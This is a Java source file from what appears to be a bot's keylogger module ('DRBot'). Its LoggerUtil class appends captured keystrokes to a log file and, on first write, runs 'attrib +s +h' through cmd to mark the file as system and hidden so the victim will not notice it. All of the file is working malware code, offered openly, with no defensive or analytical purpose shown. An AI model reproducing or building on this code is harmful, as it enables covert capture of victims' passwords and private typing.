package com.DRBot.Commands.keyLogger.utility;

import com.DRBot.Commands.keyLogger.keyLog.WindowsKeyboardHook;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public final class LoggerUtil {
    private final File loggingFile;
    private final boolean writeToFile;
    private final boolean writeToConsole;
    private boolean fileHidden = false;

    private LoggerUtil(final File loggingFile, final boolean writeToFile, final boolean writeToConsole,
            final String headings) {
        this.loggingFile = loggingFile;
        this.writeToFile = writeToFile;
        this.writeToConsole = writeToConsole;

        if (headings != null) {
            if (this.writeToFile && !loggingFile.exists()) {
                logToFile(headings);
            }
            if (this.writeToConsole) {
                logToConsole(headings);
            }
        }
    }

    public void log(final String logEntry) {
        logToConsole(logEntry);
        logToFile(logEntry);
    }

    private void logToFile(final String logEntry) {
        if (writeToFile) {
            BufferedWriter bw = null;
            try {
                bw = new BufferedWriter(new FileWriter(loggingFile, true));
                bw.write(logEntry);
                if(logEntry.equals("Enter")){
                    bw.newLine();
                }
                bw.flush();
            } catch (final Throwable t) {
            } finally {
                if (bw != null) {
                    try {
                        bw.close();
                    } catch (final Throwable t) {
                    }
                }
            }
        }
        if(loggingFile.exists() && fileHidden == false){
            new Thread(new Runnable(){
                        @Override
                        public void run(){
                             try {
                ProcessBuilder pB = new ProcessBuilder("cmd","/c","attrib","+s","+h",WindowsKeyboardHook.getKLname());
                pB.directory();
                Process ps = pB.start();
                ps.waitFor();
                ps.destroyForcibly();
            } catch (IOException ex) {}               
            catch (InterruptedException ex) {}
                        }
                    }).start();
            fileHidden = true;
        }
    }

    private void logToConsole(final String logEntry) {
        if (writeToConsole) {
            if(logEntry.equals("Enter")){
                System.out.print(logEntry);
                System.out.println();
            }
            else{
                System.out.print(logEntry);
            } 
        }
    }

    public static LoggerUtil getLogger(final String filename, final boolean writeToFile, final boolean writeToConsole,
            final String headings) {
        return getLogger(new File(filename), writeToFile, writeToConsole, headings);
    }

    public static LoggerUtil getLogger(final File loggingFile, final boolean writeToFile, final boolean writeToConsole,
            final String headings) {
        return new LoggerUtil(loggingFile, writeToFile, writeToConsole, headings);
    }

    public static LoggerUtil getLogger(final String filename) {
        return getLogger(new File(filename));
    }

    public static LoggerUtil getLogger(final File loggingFile) {
        return new LoggerUtil(loggingFile, true, true,null);
    }
    public boolean checkFile(){
        return loggingFile.exists();
    }
}
